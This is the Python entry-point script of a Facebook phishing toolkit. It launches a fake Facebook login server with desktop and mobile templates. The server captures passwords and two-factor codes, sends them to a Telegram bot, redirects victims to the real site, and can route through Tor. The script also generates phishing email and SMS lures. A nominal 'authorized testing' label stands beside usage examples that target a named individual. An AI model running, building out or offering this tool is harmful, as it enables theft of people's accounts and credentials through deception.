#!/usr/bin/env python3
"""
Facebook Phishing Toolkit - Main Entry Point
Author : Jitu Jak
Motivated to : Nancy

Usage:
    sudo python3 fb_phish.py --port 443
    python3 fb_phish.py --generate-email --email target@example.com --domain evil.com
"""

import sys
import os
import argparse
import json

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.server import PhishingServer
from modules.logger import CredentialLogger
from modules.emailer import EmailGenerator
from modules.utils import banner, check_dependencies

CONFIG_PATH = "config/settings.json"

def load_config():
    with open(CONFIG_PATH, 'r') as f:
        return json.load(f)

def main():
    parser = argparse.ArgumentParser(
        description="Facebook Phishing Toolkit - Authorized Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start phishing server on port 443 (HTTPS)
  sudo python3 fb_phish.py --port 443

  # Start on port 8080 with HTTP
  python3 fb_phish.py --port 8080 --no-https

  # Generate phishing email template
  python3 fb_phish.py --generate-email --email nancy@target.com --domain your-domain.com

  # Full campaign with all features
  sudo python3 fb_phish.py --port 443 --redirect https://facebook.com --telegram-bot TOKEN --chat-id ID
        """
    )
    
    parser.add_argument('--port', type=int, help='Port to listen on')
    parser.add_argument('--host', help='Host to bind to')
    parser.add_argument('--redirect', help='Redirect URL after capture')
    parser.add_argument('--no-https', action='store_true', help='Disable HTTPS')
    parser.add_argument('--no-2fa', action='store_true', help='Disable 2FA capture')
    parser.add_argument('--log', help='Log file path')
    parser.add_argument('--generate-email', action='store_true', help='Generate email template only')
    parser.add_argument('--email', help='Target email address')
    parser.add_argument('--domain', help='Phishing domain')
    parser.add_argument('--telegram-bot', help='Telegram bot token for notifications')
    parser.add_argument('--chat-id', help='Telegram chat ID')
    parser.add_argument('--mob', action='store_true', help='Use mobile-optimized template')
    parser.add_argument('--tor', action='store_true', help='Route through Tor')
    parser.add_argument('--quiet', action='store_true', help='Minimal output')
    
    args = parser.parse_args()
    
    # Show banner
    if not args.quiet:
        banner()
    
    # Check dependencies
    if not args.no_https:
        check_dependencies()
    
    # Load config
    config = load_config()
    
    # Override config with CLI args
    if args.port: config['server']['port'] = args.port
    if args.host: config['server']['host'] = args.host
    if args.redirect: config['redirect']['after_login'] = args.redirect
    if args.no_https: config['server']['use_https'] = False
    if args.no_2fa: config['capture']['two_factor'] = False
    if args.log: config['logging']['log_directory'] = os.path.dirname(args.log)
    if args.telegram_bot: config['logging']['telegram_bot_token'] = args.telegram_bot
    if args.chat_id: config['logging']['telegram_chat_id'] = args.chat_id
    
    # Initialize logger
    logger = CredentialLogger(config)
    
    # Generate email template if requested
    if args.generate_email:
        if not args.email or not args.domain:
            print("[!] --email and --domain required for email generation")
            sys.exit(1)
        
        gen = EmailGenerator(config)
        email_html = gen.generate_security_alert(args.email, f"https://{args.domain}/")
        
        output_file = "payloads/phishing_email.html"
        with open(output_file, 'w') as f:
            f.write(email_html)
        print(f"[+] Phishing email saved to: {output_file}")
        
        # Also generate SMS template
        sms = gen.generate_sms_template(f"https://{args.domain}/")
        with open("payloads/sms_template.txt", 'w') as f:
            f.write(sms)
        print(f"[+] SMS template saved to: payloads/sms_template.txt")
        return
    
    # Determine which template to use
    template_type = "mobile" if args.mob else "desktop"
    
    # Start server
    server = PhishingServer(config, logger, template_type)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        server.stop()
        print("[*] Session ended.")
        sys.exit(0)

if __name__ == "__main__":
    main()